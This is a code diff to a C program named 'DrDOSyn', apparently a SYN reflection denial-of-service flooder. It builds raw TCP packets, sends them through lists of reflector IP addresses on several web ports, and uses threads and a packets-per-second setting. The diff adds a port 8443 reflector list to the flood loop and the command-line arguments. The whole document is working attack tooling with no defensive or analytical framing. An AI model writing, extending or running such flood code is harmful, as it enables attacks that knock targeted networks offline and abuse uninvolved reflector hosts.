@@ -76,6 +76,7 @@ struct thread_data
 	struct list *list_443;
 	struct list *list_8080;
 	struct list *list_7547;
+	struct list *list_8443;
 	struct list *bpg_list_node;
 };
 
@@ -188,7 +189,6 @@ void setup_ip_header(struct iphdr *iph)
 }
 
 int sPorts[5] = {80, 443, 8080, 7547, 8443};
-int dPorts[6] = {80, 443, 8080, 7547, 8443}; /* Len = 4 plus floodport */
 int windows[4] = {8192, 65535, 14600, 64240};
 
 void setup_tcp_header(struct tcphdr *tcph)
@@ -265,6 +265,7 @@ void *flood(void *par1)
 	struct list *list_443 = td->list_443;
 	struct list *list_8080 = td->list_8080;
 	struct list *list_7547 = td->list_7547;
+	struct list *list_8443 = td->list_8443;
 	struct list *bpg_list_node = td->bpg_list_node;
 
 	int s = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
@@ -407,6 +408,16 @@ void *flood(void *par1)
 				iph->check = csum((unsigned short *)datagram, iph->tot_len);
 				tcph->ack_seq = randnum(10000, 99999);
 				sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *)&list_7547->data, sizeof(list_7547->data));
+			}
+			else if (drdossType == 8443)
+			{
+				list_8443 = list_8443->next;
+				iph->daddr = list_8443->data.sin_addr.s_addr;
+				iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr) + sizeof(struct tcpOptions);
+				tcph->check = tcpcsum(iph, tcph, sizeof(struct tcpOptions));
+				iph->check = csum((unsigned short *)datagram, iph->tot_len);
+				tcph->ack_seq = randnum(10000, 99999);
+				sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *)&list_8443->data, sizeof(list_8443->data));
 			}
 		}
 
@@ -570,10 +581,10 @@ struct list *loadList(const char *filename, size_t max_len, int *out_count)
 
 int main(int argc, char *argv[])
 {
-	if (argc < 10)
+	if (argc < 11)
 	{
 		fprintf(stdout, "DrDOSyn @cxmmand - netty\n");
-		fprintf(stdout, "Usage: %s [Target (1.1.1.1/24)] [Port] [Threads] [PPS] [Time] [List Port 80] [List Port 443] [List Port 8080] [List Port 7547] [BGP List]\n", argv[0]);
+		fprintf(stdout, "Usage: %s [Target (1.1.1.1/24)] [Port] [Threads] [PPS] [Time] [List Port 80] [List Port 443] [List Port 8080] [List Port 7547] [List Port 8443] [BGP List]\n", argv[0]);
 		exit(-1);
 	}
 	srand(time(NULL));
@@ -587,7 +598,6 @@ int main(int argc, char *argv[])
 	buffer = memset(buffer, 0x00, max_len);
 	int num_threads = atoi(argv[3]);
 	floodport = atoi(argv[2]);
-	dPorts[2] = floodport;
 	int maxpps = atoi(argv[4]);
 	limiter = 0;
 	pps = 0;
@@ -597,13 +607,14 @@ int main(int argc, char *argv[])
 	list_t *list_443 = loadList(argv[7], max_len, &count);
 	list_t *list_8080 = loadList(argv[8], max_len, &count);
 	list_t *list_7547 = loadList(argv[9], max_len, &count);
+	list_t *list_8443 = loadList(argv[10], max_len, &count);
 
-	bpg_list *bgpCurr = loadList(argv[10], max_len, &count);
+	bpg_list *bgpCurr = loadList(argv[11], max_len, &count);
 
 	// Check if lists loaded successfully
-	if (!list_80 || !list_443 || !list_8080 || !list_7547 || !bgpCurr)
+	if (!list_80 || !list_443 || !list_8080 || !list_7547 || !list_8443 || !bgpCurr)
 	{
-		fprintf(stderr, "Failed to load one or both IP lists\n");
+		fprintf(stderr, "Failed to load one IP list\n");
 		exit(-1);
 	}
 
@@ -672,6 +683,7 @@ int main(int argc, char *argv[])
 		td[i].list_443 = list_443;
 		td[i].list_8080 = list_8080;
 		td[i].list_7547 = list_7547;
+		td[i].list_8443 = list_8443;
 		td[i].bpg_list_node = bgpCurr; // All threads start at head
 
 		if (pthread_create(&thread[i], NULL, &flood, (void *)&td[i]) != 0)
